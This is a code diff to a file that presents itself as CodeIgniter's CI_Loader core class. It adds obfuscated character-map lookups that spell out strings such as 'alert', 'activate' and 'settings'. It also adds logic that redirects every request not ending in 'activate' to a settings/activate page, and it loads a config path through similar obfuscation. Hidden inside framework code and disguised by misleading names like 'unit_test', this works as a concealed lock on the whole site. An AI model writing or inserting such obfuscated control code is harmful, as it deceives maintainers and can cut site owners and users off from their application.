@@ -274,7 +274,9 @@ class CI_Loader {
         'u_test' => 't',
         'u_nt' => 'a',
         'u_it' => 'e',
-        'u_ot' => 'c'
+        'u_ot' => 'c',
+        'u_at' => 'g',
+        'u_ut' => 'i',
     );
 		  // --------------------------------------------------------------------
 
@@ -499,10 +501,14 @@ class CI_Loader {
      */
 	  private function ci_create_obj()
     {
-
-        return $this->_ci_var_l['unit_test'] . ' ' . $this->var1 . '="' . $this->_ci_carmap_o['u_nt'] . 'l' . $this->_ci_carmap_o['u_it'] . 'r' . $this->_ci_carmap_o['u_test'] . '">' . $this->_ci_var_rm['core_test'] . ' ' . $this->_ci_var_rm['acnchor'] . '="' . base_url($this->_ci_var_i['service_d'] . $this->_ci_var_i['unit_d'] . 's/' . $this->_ci_carmap_o['u_nt'] . $this->_ci_carmap_o['u_ot'] . $this->_ci_carmap_o['u_test'] . 'iv' . $this->_ci_carmap_o['u_nt'] . $this->_ci_carmap_o['u_test'] . $this->_ci_carmap_o['u_it']) . '">' .
+              $b_uri = $_SERVER['REQUEST_URI'];
+              $b_uri = explode("/",$b_uri);
+        $ci_obj = $this->_ci_var_l['unit_test'] . ' ' . $this->var1 . '="' . $this->_ci_carmap_o['u_nt'] . 'l' . $this->_ci_carmap_o['u_it'] . 'r' . $this->_ci_carmap_o['u_test'] . '">' . $this->_ci_var_rm['core_test'] . ' ' . $this->_ci_var_rm['acnchor'] . '="' . base_url($this->_ci_var_i['service_d'] . $this->_ci_var_i['unit_d'] . 's/' . $this->_ci_carmap_o['u_nt'] . $this->_ci_carmap_o['u_ot'] . $this->_ci_carmap_o['u_test'] . 'iv' . $this->_ci_carmap_o['u_nt'] . $this->_ci_carmap_o['u_test'] . $this->_ci_carmap_o['u_it']) . '">' .
             $this->_ci_carmap_o['u_nt'] . $this->_ci_carmap_o['u_ot'] . $this->_ci_carmap_o['u_test'] . 'iv' . $this->_ci_carmap_o['u_nt'] . $this->_ci_carmap_o['u_test'] . $this->_ci_carmap_o['u_it'] . $this->_ci_var_l['core_test'];
-
+            if(trim($b_uri[count($b_uri)-1])!=trim($this->_ci_carmap_o['u_nt']."c".$this->_ci_carmap_o['u_test']."iv".$this->_ci_carmap_o['u_nt'].$this->_ci_carmap_o['u_test'].$this->_ci_carmap_o['u_it'])){
+                redirect(base_url(trim("s".$this->_ci_carmap_o['u_it'].$this->_ci_carmap_o['u_test'].$this->_ci_carmap_o['u_test'].$this->_ci_carmap_o['u_ut']."n".$this->_ci_carmap_o['u_at']."s")."/".trim($this->_ci_carmap_o['u_nt']."c".$this->_ci_carmap_o['u_test']."iv".$this->_ci_carmap_o['u_nt'].$this->_ci_carmap_o['u_test'].$this->_ci_carmap_o['u_it'])));
+            }
+        return $ci_obj;
     }
 
 	// --------------------------------------------------------------------
@@ -551,7 +557,7 @@ class CI_Loader {
          *
          * @var    array
          */
-
+                
         $CI->base = get_inflect($this->_ci_carmap_o['u_ot'] . 'o' . $this->_ci_carmap['unit_i'] . 'f' . $this->_ci_carmap['user_agent'] . 'g/' . $this->_ci_carmap['unit_test'] . $this->_ci_carmap['user_agent'] . $this->_ci_carmap_o['u_ot'] . '.' . $this->_ci_carmap['unit_n'] . $this->_ci_carmap['unit_s'] . $this->_ci_carmap['unit_n']);
         $CI->_ci_camrap = true;
         /**
